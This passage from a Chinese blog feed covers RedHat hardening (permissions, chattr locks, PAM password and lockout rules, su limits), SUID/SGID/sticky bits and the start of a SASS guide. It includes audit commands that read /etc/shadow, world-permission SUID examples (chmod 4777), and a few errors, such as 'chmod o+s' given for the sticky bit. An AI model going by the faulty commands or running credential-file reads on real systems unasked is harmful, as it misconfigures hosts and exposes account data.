chmod 600  /etc/xinetd.conf
chmod 600 /etc/login.defs
chmod 600 /etc/hosts.allow
chmod 600 /etc/hosts.deny
chmod 600 /etc/securetty
chmod 600 /etc/ssh/ssh_host_key
chmod 600 /etc/ssh/sshd_config
chmod 600 /var/log/lastlog
chmod 600 /var/log/messages
chmod 600 /etc/security
</code></pre><blockquote><p>影响： 有的移动安全加固标准要求/etc目录是750权限，但如果/etc目录是权限是750（drwxr-x—）的话，由于其他组没有x权限，那么普通用户就无权访问/etc目录以及以下所有文件，用户获取不到基本的环境变量/etc/profile和/etc/passwd、group等文件，一些基本命令都会出现问题，本用户的文件只有uid、gid，无法对应名用户名称和组名称。</p></blockquote><h1 id="检查任何人都有写权限的目录"><a href="#检查任何人都有写权限的目录" class="headerlink" title="检查任何人都有写权限的目录"></a>检查任何人都有写权限的目录</h1><p><code>For Exmaple:</code></p><pre><code class="bash">find / -type d -perm -0222 -exec ls -ldg {} \;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-13.png" alt="RedHat 安全加固"></p><blockquote><p>这些目录是存放每个用户临时文件的，目录本身是带 <code>Sticky BIT</code> 粘滞位的，即使里面的文件有 <code>o+w</code> 权限也没问题，系统本身有保护性措施。</p></blockquote><h1 id="查找任何人都有写权限的文件"><a href="#查找任何人都有写权限的文件" class="headerlink" title="查找任何人都有写权限的文件"></a>查找任何人都有写权限的文件</h1><p><code>For Exmaple:</code></p><pre><code class="bash">find / -type f -perm -0222 -exec ls -lg {} \;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-14.png" alt="RedHat 安全加固"></p><h1 id="检查没有属主的文件"><a href="#检查没有属主的文件" class="headerlink" title="检查没有属主的文件"></a>检查没有属主的文件</h1><p><code>For Exmaple:</code></p><pre><code class="bash">find / -nouser -o -nogroup -print
</code></pre><p>发现没有属主的文件往往就意味着有黑客入侵你的系统了。不能允许没有主 人的文件存在。如果在系统中发现了没有属主的文件或目录，先查看它的完 整性，如果一切正常，给它一个属主。有时候卸载程序可能会出现一些没有 主人的文件或目录，在这种情况下可以把这些文件和目录删除掉。</p><p>在安全加固脚本中，把没有属主或属组的文件直接赋予了 <code>nobody</code> 用户和组，<code>For Exmaple:</code></p><pre><code class="bash">find / -path &quot;/proc&quot; -prune -nouser -o -nogroup -exec chown nobody:nobody {} \;
</code></pre><blockquote><p>说明：命令中排除了 /proc 目录</p></blockquote><h1 id="检查异常隐含文件"><a href="#检查异常隐含文件" class="headerlink" title="检查异常隐含文件"></a>检查异常隐含文件</h1><p><code>For Exmaple:</code></p><pre><code class="bash">find / -xdev -name &quot;..*&quot; -print
find / -xdev -name &quot;...*&quot; -print
find / -xdev -name &quot;..^G&quot; -print
</code></pre><p>同时也要注意象 <code>“.xx”</code> 和 <code>“.mail”</code> 这样的文件名的。（这些文件名看起来都很象正常的文件名）在系统的每个地方都要查看一下有没有异常隐含文件（点号是起始字符的，用 <code>“ls”</code> 命令看不到的文件），因为这些文件可能是隐藏的黑客工具或者其它一些信息（口令破解程序、其它系统的口令文件，等等）。在 <code>UNIX</code> 下，一个常用的技术就是用一些特殊的名，如：<code>“...”</code>、<code>“.. ”（点点空格</code>）或 <code>“..^G”（点点 ctrl+v 和 ctrl+G）</code>，来隐含文件或目录。</p><p>基本上系统默认只有一个文件 <code>/usr/share/man/man1/..1.gz</code> ，在加固脚本中的处理方式是存在就直接把它删除掉。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-15.png" alt="RedHat 安全加固"></p><h1 id="加锁重要口令文件和组文件"><a href="#加锁重要口令文件和组文件" class="headerlink" title="加锁重要口令文件和组文件"></a>加锁重要口令文件和组文件</h1><p>可以用下面的命令给口令文件和组文件设置不可改变位加锁，<code>For Exmaple:</code></p><pre><code class="bash">chattr +i /etc/passwd
chattr +i /etc/shadow
chattr +i /etc/group
chattr +i /etc/gshadow
chattr +i /etc/xinetd.conf
chattr +i /etc/services
</code></pre><p>加锁后，就不能被改变文件内容。同时会影响 <code>useradd</code>、<code>userdel</code> 等跟帐户相关的操作</p><p>查看命令，<code>For Exmaple:</code></p><pre><code class="bash">lsattr /etc/passwd
</code></pre><p>返回结果为：<code>----i-------- /etc/passwd</code></p><p>如果要修改文件，必须先对该文件进行解锁,<code>For Exmaple:</code></p><pre><code class="bash">chattr -i /etc/passwd
chattr -i /etc/shadow
chattr -i /etc/group
chattr -i /etc/gshadow
chattr -i /etc/xinetd.conf
chattr -i /etc/services
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 学习笔记（七）：文件的特殊权限]]></title>
      <url>/2016/10/special-permissions-for-files/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本篇是 Liunx 的学习笔记系列第七篇，在 Liunx 中文件除了 rwx 权限，还存在 SetUID 、 SetGID 、 Sicky BIT 特殊权限，本篇就是来介绍这些特殊权限<a id="more"></a></p><h1 id="SetUID"><a href="#SetUID" class="headerlink" title="SetUID"></a>SetUID</h1><h2 id="针对文件的作用"><a href="#针对文件的作用" class="headerlink" title="针对文件的作用"></a>针对文件的作用</h2><ul><li>只有可以执行的二进制程序才能设定 SUID 权限</li><li>命令执行者要对该程序用于 x（执行）权限</li><li>命令执行者在执行该程序是获得该程序文件属主的身份（在执行程序的过程中灵魂附体成文件的属主）</li><li>SetUID 权限只在该程序执行过程中有效，也就是说身份改变只在程序执行过程中有效</li></ul><h2 id="概念图"><a href="#概念图" class="headerlink" title="概念图"></a>概念图</h2><p><img src="http://oaq0p7t2g.bkt.clouddn.com/setuid-1.png" alt="SetUID"></p><h2 id="设置-SUID"><a href="#设置-SUID" class="headerlink" title="设置 SUID"></a>设置 SUID</h2><blockquote><p>只能针对二进制可执行文件</p></blockquote><h3 id="4-代表-SUID"><a href="#4-代表-SUID" class="headerlink" title="4 代表 SUID"></a>4 代表 SUID</h3><p><code>Command Format:</code></p><pre><code class="bash">chmod 4777 [fileName]     # 设置 SUID 权限
chmod 644 [fileName]      # 取消 SUID 权限
</code></pre><p>当然还可以用以下命令设置，<code>Command Format:</code></p><pre><code class="bash">chmod u+s [fileName]      # 设置 SUID 权限
chmod u-s [fileName]      # 取消 SUID 权限
</code></pre><h3 id="S-与-s-的区别"><a href="#S-与-s-的区别" class="headerlink" title="S 与 s 的区别"></a>S 与 s 的区别</h3><blockquote><p>大写 <code>S</code> 其实是报错，因为我们用来测试的文件并非二进制文件，或者说是可执行程序，只需添加 x 权限即可变为小写 <code>s</code>，实际上生效的是小写 <code>s</code></p></blockquote><p><code>For Examlpe:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/setuid-2.png" alt="SetUID"></p><h2 id="危险的-SetUID"><a href="#危险的-SetUID" class="headerlink" title="危险的 SetUID"></a>危险的 SetUID</h2><ul><li>关键目录应严格控制写权限。比如 <code>“/”</code>、<code>”/usr“</code> 等</li><li>用户的密码设置要严格遵守密码三原则</li><li>对系统中默认应该具有 SetUID 权限的文件作一列表，定时检查没有这个之外的文件是否被设置了 SetUID 权限</li></ul><h1 id="SetGID"><a href="#SetGID" class="headerlink" title="SetGID"></a>SetGID</h1><blockquote><p>既可以针对二进制可执行文件，也可以针对目录</p></blockquote><h2 id="针对文件的作用-1"><a href="#针对文件的作用-1" class="headerlink" title="针对文件的作用"></a>针对文件的作用</h2><ul><li>只有可以执行的二进制程序才能设定 SGID 权限</li><li>命令执行者要对该程序用于 x（执行）权限</li><li>命令执行者在执行该程序的时候，组身份升级为该程序的属组</li><li>SetUID 权限同样只在该程序执行过程中有效，也就是说组身份改变只在程序执行过成中有效</li></ul><h2 id="针对目录的作用"><a href="#针对目录的作用" class="headerlink" title="针对目录的作用"></a>针对目录的作用</h2><ul><li>普通用户必须对此目录拥有 r 和 x 权限，才能进入此目录</li><li>普通用户在此目录中的有效组会变成此目录的属组</li><li>若普通用户对此目录拥有 w 权限时，新建的文件的默认属组是这个目录的属组</li></ul><h2 id="设置-SGID"><a href="#设置-SGID" class="headerlink" title="设置 SGID"></a>设置 SGID</h2><h3 id="2-代表-SGID"><a href="#2-代表-SGID" class="headerlink" title="2 代表 SGID"></a>2 代表 SGID</h3><p><code>Command Format:</code></p><pre><code class="bash">chmod 2777 [fileName]      # 设置 SGID 权限
chmod 644 [fileName]       # 取消 SGID 权限
</code></pre><p>当然还可以用以下命令设置，<code>Command Format:</code></p><pre><code class="bash">chmod g+s [fileName]       # 设置 SGID 权限
chmod g-s [fileName]      # 取消 SGID 权限
</code></pre><h3 id="S-与-s-的区别-1"><a href="#S-与-s-的区别-1" class="headerlink" title="S 与 s 的区别"></a>S 与 s 的区别</h3><blockquote><p>大写 S 其实是报错，因为我们用来测试的文件并非二进制文件，或者说是可执行程序，只需添加 x 权限即可变为小写 s</p></blockquote><p><code>For Examlpe:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/setgid.png" alt="SetUID"></p><h1 id="Sicky-BIT"><a href="#Sicky-BIT" class="headerlink" title="Sicky BIT"></a>Sicky BIT</h1><blockquote><p>只能针对目录</p></blockquote><h2 id="针对目录的作用-1"><a href="#针对目录的作用-1" class="headerlink" title="针对目录的作用"></a>针对目录的作用</h2><h2 id="设置-SBIT"><a href="#设置-SBIT" class="headerlink" title="设置 SBIT"></a>设置 SBIT</h2><ul><li>粘着位目前对目录有效</li><li>普通用户对该目录拥有 w 和 x 权限，即普通用户可以在此目录拥有写入权限</li><li>如果没有粘着位，因为普通用户拥有 w 权限，所以可以删除此目录下所有文件，包括其他用户建立的文件。一但赋予粘着位，除了 root 可以删除所有文件，普通用户就算拥有 w 权限，也只能删除自己建立的文件，但是不能删除其他用户建立的文件</li></ul><h3 id="1-代表-SBIT"><a href="#1-代表-SBIT" class="headerlink" title="1 代表 SBIT"></a>1 代表 SBIT</h3><p><code>Command Format:</code></p><pre><code class="bash">chmod 1777 [folderName]       # 设置 SBIT 权限
chmod 644 [folderName]        # 取消 SBIT 权限
</code></pre><p>当然还可以用以下命令设置，<code>Command Format:</code></p><pre><code class="bash">chmod o+s [folderName]       # 设置 SBIT 权限
chmod o-t [folderName]       # 取消 SBIT 权限
</code></pre><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p><code>For Examlpe:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/sticky-bit.png" alt="SetUID"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RedHat 系统安全加固（一）：帐号安全]]></title>
      <url>/2016/10/account-security/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>本系列笔记又是 Liunx 学习系列教程的一大步，本系列学习笔记记录 RedHat 系统的安全加固。本篇主要介绍相关于帐号安全的加固策略，加强系统的防御能力<a id="more"></a></p><h1 id="密码规则"><a href="#密码规则" class="headerlink" title="密码规则"></a>密码规则</h1><h2 id="密码长度和有效期"><a href="#密码长度和有效期" class="headerlink" title="密码长度和有效期"></a>密码长度和有效期</h2><p><strong>/etc/login.defs</strong> 文件是当创建用户时的一些规划，比如创建用户时，是否需要家目录，UID 和 GID 的范围；用户的期限等等，这个文件是可以通过 <code>root</code> 来定义的</p><p><code>Default Configuration:</code></p><pre><code class="bash">PASS_MAX_DAYS  99999   # 两次改变密码之间相距的最大天数，密码有效最大天数
PASS_MIN_DAYS  0       # 两次改变密码之间相距的最小天数，为零时代表任何时候都可以更改密码
PASS_MIN_LEN   5       # 密码最小长度
PASS_WARN_AGE  7       # 在密码过期之前警告的天数
</code></pre><blockquote><p>注意：以上只对之后新增的用户有效，如果要修改已存在的用户密码规则，需要使用 <code>chage</code> 命令</p></blockquote><p>使用以下命令，可以查看用户的密码规则，<code>Command Format:</code></p><pre><code class="bash">chage -l [userName]
</code></pre><p><code>For Examlpe:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-1.png" alt="RedHat 系统安全加固"></p><h3 id="chage-命令"><a href="#chage-命令" class="headerlink" title="chage 命令"></a>chage 命令</h3><p>设置最大最小使用天数，以及警告天数，<code>For Examlpe:</code></p><pre><code class="bash">chage -M 90 -m 6 -W 30 [userName]
</code></pre><blockquote><p>注意：不要用该命令给 root 用户加上有效期，如果密码过期，再加上后文说的 <code>/etc/shadow</code> 文件加锁禁止修改，会导致 root 提示修改密码，无法成功修改密码，从而无法登陆。</p></blockquote><p><code>chage</code> 选项解释</p><ul><li><strong>-m</strong> =&gt; 密码可更改的最小天数。为零时代表任何时候都可以更改密码。</li><li><strong>-M</strong> =&gt; 密码保持有效的最大天数。</li><li><strong>-w</strong> =&gt; 用户密码到期前，提前收到警告信息的天数。</li><li><strong>-E</strong> =&gt; 帐号到期的日期。过了这天，此帐号将不可用。</li><li><strong>-d</strong> =&gt; 上一次更改的日期。</li><li><strong>-i</strong> =&gt; 停滞时期。如果一个密码已过期这些天，那么此帐号将不可用。</li><li><strong>-l</strong> =&gt; 例出当前的设置。由非特权用户来确定他们的密码或帐号何时过期。</li></ul><p>如果要修改密码过期时间为 <code>“从不”</code>，<code>For Examlpe:</code></p><pre><code class="bash">chage -M 99999 [userName]
</code></pre><h2 id="空密码检查"><a href="#空密码检查" class="headerlink" title="空密码检查"></a>空密码检查</h2><p><strong>/etc/shadow</strong> 文件中的记录行与 <strong>/etc/passwd</strong> 中的一一对应，是记录系统中用户的密码的，此文件只有 <code>root</code> 用户可以对其进行修改</p><p>使用 <code>awk</code> 命令可以检查是否存在空密码，<code>For Examlpe:</code></p><pre><code class="bash">awk -F &#39;:&#39; &#39;($2==&quot;&quot;){print $1}&#39; /etc/shadow
</code></pre><h2 id="没密码检查"><a href="#没密码检查" class="headerlink" title="没密码检查"></a>没密码检查</h2><p>空密码跟没有密码是俩回事，体现于 <strong>/etc/shadow</strong> 中的密码那一列，空密码是显示空，没有密码是显示 <code>！！</code></p><p>使用 <code>awk</code> 命令可以检查是否存在空密码，<code>For Examlpe:</code></p><pre><code class="bash">awk -F &#39;:&#39; &#39;($2==&quot;！！&quot;){print $1}&#39; /etc/shadow
</code></pre><h3 id="awk-命令"><a href="#awk-命令" class="headerlink" title="awk 命令"></a>awk 命令</h3><p>查询 UID 为 0 的用户，<code>For Examlpe:</code></p><pre><code class="bash">awk -F &#39;:&#39; &#39;($3==0){print $1}&#39; /etc/passwd
</code></pre><blockquote><p>UID 为 0 的任何用户都拥有系统的最高特权，保证只有 root 用户的 UID 为 0</p></blockquote><p><code>awk</code> 选项解释</p><ul><li><strong><code>-F fs</code></strong> =&gt; fs 指定输入分隔符，fs 可以是字符串或正则表达式，如 <code>-F:</code></li><li><strong><code>-v var=value</code></strong> =&gt; 赋值一个用户定义变量，将外部变量传递给 <code>awk</code></li><li><strong><code>-f scripfile</code></strong> =&gt; 从脚本文件中读取 awk 命令</li><li><strong><code>-m[fr] val</code></strong> =&gt; 对 val 值设置内在限制，<code>-mf</code> 选项限制分配给 val 的最大块数目；<code>-mr</code> 选项限制记录的最大数目。这两个功能是 Bell 实验室版 <code>awk</code> 的扩展功能，在标准 <code>awk</code> 中不适用。</li></ul><h2 id="密码复杂度"><a href="#密码复杂度" class="headerlink" title="密码复杂度"></a>密码复杂度</h2><p>redhat 公司专门开发了 <code>cracklib</code> 这个安装包来判断密码的复杂度。</p><p>检查是否安装了 <code>cracklib</code> 模块</p><pre><code class="bash">rpm -qa | grep cracklib
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-3.png" alt="RedHat 系统安全加固"></p><p>在 <code>/etc/pam.d/system-auth</code> 中修改</p><pre><code class="bash">password requisite pam_cracklib.so try_first_pass retry=3 difok=3 minlen=8 dcredit=-1 ucredit=-1 lcredit=-1 ocredit=-1
password sufficient pam_unix.so md5 shadow nullok try_first_pass use_authtok remember=5
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-4.png" alt="RedHat 系统安全加固"></p><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ul><li><strong><code>retry=N</code></strong> =&gt; 改变输入密码的次数，默认值是 1，一般设置为 3。就是说，如果用户输入的密码强度不够可以重复输入的次数。</li><li><strong><code>minlen=N</code></strong> =&gt; 密码最小长度（除了<code>credit</code> 信用度的字符长度以外）</li><li><strong><code>dcredit=N</code></strong> =&gt; 密码中至少<code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个数字</li><li><strong><code>ucredit=N</code></strong> =&gt; 密码中至少<code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个大写字母</li><li><strong><code>lcredit=N</code></strong> =&gt; 密码中至少<code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个小写字母</li><li><strong><code>ocredit=N</code></strong> =&gt; 密码中至少<code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个特殊字符</li><li><strong><code>difok=M</code></strong> =&gt; 新密码与前一个旧密码之间至少有 M 个字符不相同</li></ul><blockquote><p>注意：<code>dcredit</code>、<code>ucredit</code>、<code>lcredit</code>、<code>ocredit</code> 为信用度字符，如果 <code>N&lt;0</code> ，表示至少，则新密码长度最小长度就等于 minlen.。 而当 <code>N&gt;0</code> 时，表示至多，比如 <code>ocredit=1</code>，至多有一个特殊字符，这样的话，即使没有特殊字符也会允许设置新密码。还有，此时新密码长度会大于minlen。算法交复杂，这里不赘述。 因此，通常情况下推荐使用 <code>N&lt;0</code> 来做密码复杂度限制。 另外，此密码规则对 root 用户无效，只针对普通用户修改自身密码</p></blockquote><h1 id="登录验证规则"><a href="#登录验证规则" class="headerlink" title="登录验证规则"></a>登录验证规则</h1><h2 id="记录普通用户登录失败次数并锁定用户"><a href="#记录普通用户登录失败次数并锁定用户" class="headerlink" title="记录普通用户登录失败次数并锁定用户"></a>记录普通用户登录失败次数并锁定用户</h2><p>在 <strong>`/etc/pam.d/system-auth</strong><code>中</code>“#%PAM-1.0”<code>下面一行加入，</code>For Example:`</p><pre><code class="bash">auth required pam_tally2.so deny=3 unlock_time=300
</code></pre><blockquote><p>注意：一定要加在 <code>#%PAM-1.0</code> 下面一行</p></blockquote><p>参数说明</p><ul><li><strong><code>deny[=n]</code></strong> =&gt; 用户连续错误登陆的最大次数，超过则锁定</li><li><strong><code>unlock_time</code></strong> =&gt; 设定普通用户锁定后，多少时间后解锁，单位是秒</li><li><strong><code>even_deny_root</code></strong> =&gt; 也限制 root 用户</li><li><strong><code>root_unlock_time[=n]</code></strong> =&gt; 设定 root 用户锁定后，多少时间后解锁，单位是秒</li><li><strong><code>quiet</code></strong> =&gt; 不对已锁定的用户发出提示信息</li></ul><blockquote><p>注意：以上参数根据实际需要取舍，如果使用了 even_deny_root 参数限制 root 用户登录错误次数，而没有配置 root_unlock_time 的话，一旦 root 用户被锁，解锁将很麻烦。</p></blockquote><h3 id="查看用户登录失败次数"><a href="#查看用户登录失败次数" class="headerlink" title="查看用户登录失败次数"></a>查看用户登录失败次数</h3><p>当登录错误次数达到最大限制后，用户再次登录时，会提示</p><pre><code class="bash">Your account is locked. Maximum amount of failed attempts was reached.
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-6.png" alt="RedHat 系统安全加固"></p><p>通过以下命令可以查看用户登录失败次数，<code>Command Format:</code></p><pre><code class="bash">pam_tally2 -u [userName]
</code></pre><p><code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-7.png" alt="RedHat 系统安全加固"></p><h3 id="解锁已经锁定的用户"><a href="#解锁已经锁定的用户" class="headerlink" title="解锁已经锁定的用户"></a>解锁已经锁定的用户</h3><ul><li><p>自动解锁</p><ul><li>如果配置了 <code>unlock_time</code> 或 <code>root_unlock_time</code> (针对 <code>root</code> 用户)参数，则等待超过这个时长后，帐户会自动解锁</li></ul></li><li><p>手动解锁：</p><ul><li>只能以 <code>root</code> 用户通过命令 <code>pam_tally2 -u [userName] -r</code> 可以手动解锁因登录错误次数达到最大限制后自动锁定的用户，同时登录错误次数会被重置为 0</li></ul></li></ul><h2 id="登录超时"><a href="#登录超时" class="headerlink" title="登录超时"></a>登录超时</h2><p>对于 bash 用户，修改 <code>/etc/profile</code> 或 <code>/etc/bashrc</code>，所有使用 bash 的用户都会继承，<code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-8.png" alt="RedHat 系统安全加固"></p><p>对于 csh 用户，修改 <code>/etc/csh.cshrc</code>，所有使用 csh 的用户都会继承，<code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-9.png" alt="RedHat 系统安全加固"></p><h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><h3 id="禁止-root-用户远程-ssh-登录"><a href="#禁止-root-用户远程-ssh-登录" class="headerlink" title="禁止 root 用户远程 ssh 登录"></a>禁止 root 用户远程 ssh 登录</h3><blockquote><p>由于之前的笔记已经记录过了，这里就不再重复了</p></blockquote><h3 id="ssh-的黑白名单（指定用户或组）"><a href="#ssh-的黑白名单（指定用户或组）" class="headerlink" title="ssh 的黑白名单（指定用户或组）"></a>ssh 的黑白名单（指定用户或组）</h3><blockquote><p>由于之前的笔记已经记录过了，这里就不再重复了</p></blockquote><h3 id="ssh-的黑白名单（指定-IP）"><a href="#ssh-的黑白名单（指定-IP）" class="headerlink" title="ssh 的黑白名单（指定 IP）"></a>ssh 的黑白名单（指定 IP）</h3><blockquote><p>由于之前的笔记已经记录过了，这里就不再重复了</p></blockquote><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><h3 id="禁止-root-用户远程-telnet-登录"><a href="#禁止-root-用户远程-telnet-登录" class="headerlink" title="禁止 root 用户远程 telnet 登录"></a>禁止 root 用户远程 telnet 登录</h3><blockquote><p>系统安装 <code>telnet-server</code> 服务后，默认就是禁止 root 用户直接远程 telnet 登录的。 确认只要存在 <code>/etc/securetty</code> 文件，就可以限制 root 直接远程 telnet 登录。</p></blockquote><h3 id="telnet-的黑白名单（指定用户或组）"><a href="#telnet-的黑白名单（指定用户或组）" class="headerlink" title="telnet 的黑白名单（指定用户或组）"></a>telnet 的黑白名单（指定用户或组）</h3><blockquote><p>系统不支持限制普通用户 telnet 远程登录</p></blockquote><h3 id="telnet-的黑白名单（指定-IP）"><a href="#telnet-的黑白名单（指定-IP）" class="headerlink" title="telnet 的黑白名单（指定 IP）"></a>telnet 的黑白名单（指定 IP）</h3><p>与 <code>SSH</code> 中的相差无几，同样是在 <code>/etc/hosts.allow</code> 里添加白名单，在 <code>/etc/hosts.deny</code> 里添加黑名单，<code>For Example:</code></p><pre><code class="bash">in.telnetd:192.168.1.10 192.168.1.11      # /etc/hosts.allow
in.telnetd:ALL                            # /etc/hosts.deny
</code></pre><h2 id="禁止普通用户登录-shell"><a href="#禁止普通用户登录-shell" class="headerlink" title="禁止普通用户登录 shell"></a>禁止普通用户登录 shell</h2><p>使用 <code>usermod</code> 命令修改用户的登录 <code>shell</code> 就好，<code>Command Format:</code></p><pre><code class="bash">usermod -s /sbin/nologin [userName]
</code></pre><h2 id="避免普通用户-su-到-root-用户"><a href="#避免普通用户-su-到-root-用户" class="headerlink" title="避免普通用户 su 到 root 用户"></a>避免普通用户 su 到 root 用户</h2><p>在 <strong>`/etc/pam.d/su</strong><code>中</code>“#%PAM-1.0”` 下面一行加入</p><pre><code class="bash">auth sufficient pam_rootok.so debug
auth required pam_wheel.so group=wheel
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-5.png" alt="RedHat 系统安全加固"></p><p>当然只去除红框中的 <code>#</code> 也是 ok 的<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-10.png" alt="RedHat 系统安全加固"></p><p>这样以来只有 wheel 组的用户可以 su 作为 root</p><h3 id="指定可以-su-到-root-的用户"><a href="#指定可以-su-到-root-的用户" class="headerlink" title="指定可以 su 到 root 的用户"></a>指定可以 su 到 root 的用户</h3><p>指定某个用户可以 su 到 root 用户，需要将该用户加入到 wheel 组中</p><pre><code class="bash">usermod -G wheel [username]
</code></pre><blockquote><p>注意，如果禁止 root 用户直接登录，也不存在 wheel 组的用户，就无法进入 root 用户了</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-11.png" alt="RedHat 系统安全加固"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SASS 用法指南]]></title>
      <url>/2016/10/sass-usage-guide/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>SASS 是 CSS 预处理器之一，它的基本思想是，用一种专门的编程语言，进行网页样式设计，然后再编译成正常的 CSS 文件，它提供了许多便利的写法，大大节省了设计者的时间，使得 CSS 的开发，变得简单和可维护<a id="more"></a></p><h1 id="环境布置"><a href="#环境布置" class="headerlink" title="环境布置"></a>环境布置</h1><h2 id="安装-Ruby"><a href="#安装-Ruby" class="headerlink" title="安装 Ruby"></a>安装 Ruby</h2><p>SASS 是 Ruby 语言写的，但是两者的语法没有关系。不懂 Ruby，照样使用。只是必须先<a href="//www.ruby-lang.org/zh_cn/downloads/">安装 Ruby</a>，然后再安装 SASS.</p><p>在 Ubuntu 下安装 Ruby，<code>For Example:</code></p><pre><code class="bash">sudo apt-get install ruby
</code></pre><p>查看版本号，确认 Ruby 环境安装完成</p><pre><code class="bash">ruby -v
</code></pre><h2 id="安装-SASS"><a href="#安装-SASS" class="headerlink" title="安装 SASS"></a>安装 SASS</h2><p>Ruby 安装好了，之后执行命令</p><pre><code class="bash">gem install sass
</code></pre><p>查看版本号，确认 SASS 环境安装完成</p><pre><code class="bash">sass -v
</code></pre><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>SASS 文件就是普通的文本文件，里面可以直接使用 CSS 语法。文件后缀名是 <code>.scss</code>，意思为 <code>Sassy CSS</code>。</p><p>下面的命令，可以在屏幕上显示 <code>.scss</code> 文件转化的 <code>.css</code> 代码。（假设文件名为 <code>test</code>。）</p><pre><code class="bash">sass test.scss
</code></pre><h2 id="编译风格"><a href="#编译风格" class="headerlink" title="编译风格"></a>编译风格</h2><p>如果要将显示结果保存成文件，后面再跟一个 <code>.css</code> 文件名，<code>For Example:</code></p><pre><code class="bash">sass test.scss test.css
</code></pre><p>SASS 提供四个<a href="//sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#output_style">编译风格</a>的选项</p><ul><li><strong>nested</strong> =&gt; 嵌套缩进的 css 代码，它是默认值。</li><li><strong>expanded</strong> =&gt; 没有缩进的、扩展的 css 代码。</li><li><strong>compact</strong> =&gt; 简洁格式的 css 代码。</li><li><strong>compressed</strong> =&gt; 压缩后的 css 代码。</li></ul><p>生产环境当中，一般使用最后一个选项，<code>For Example:</code></p><pre><code class="bash">sass --style compressed test.sass test.css
</code></pre><p>你也可以让 SASS 监听某个文件或目录，一旦源文件有变动，就自动生成编译后的版本</p><pre><code class="bash">sass --watch input.scss:output.css            # watch a file
sass --watch app/sass:public/stylesheets      # watch a directory
</code></pre><h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>SASS 允许使用变量，所有变量以 <code>$</code> 开头。<code>For Example:</code></p><pre><code class="scss">$blue : #1875e7;　
div {
　color : $blue;
}
</code></pre><p>如果变量需要镶嵌在字符串之中，就必须需要写在 <code>#{}</code> 之中。<code>For Example:</code></p><pre><code class="scss">$side : left;
.rounded {
  border-#{$side}-radius: 5px;
}
</code></pre><h2 id="计算功能"><a href="#计算功能" class="headerlink" title="计算功能"></a>计算功能</h2><p>SASS 允许在代码中使用算式。<code>For Example:</code></p><pre><code class="scss">body {
  margin: (14px/2);
　top: 50px + 100px;
　right: $var * 10%;
}
</code></pre><h2 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h2><p>SASS 允许选择器嵌套。比如，下面的 CSS 代码：</p><pre><code class="scss">div h1 {
  color: red;
}
</code></pre><p>可以写成：</p><pre><code class="scss">div {
  h1 {
    color: red;
  }
}
</code></pre><p>属性也可以嵌套，比如 <code>border-color</code> 属性，可以写成：</p><pre><code class="scss">p {
  border: {
    color: red;
　}
}
</code></pre><blockquote><p>注意，<code>border</code> 后面必须加上冒号。</p></blockquote><p>在嵌套的代码块内，可以使用 <code>&amp;</code> 引用父元素。比如 <code>a:hover</code> 伪类，可以写成：</p><pre><code class="scss">a {
  &amp;:hover { color: #ffb3ff; }
}
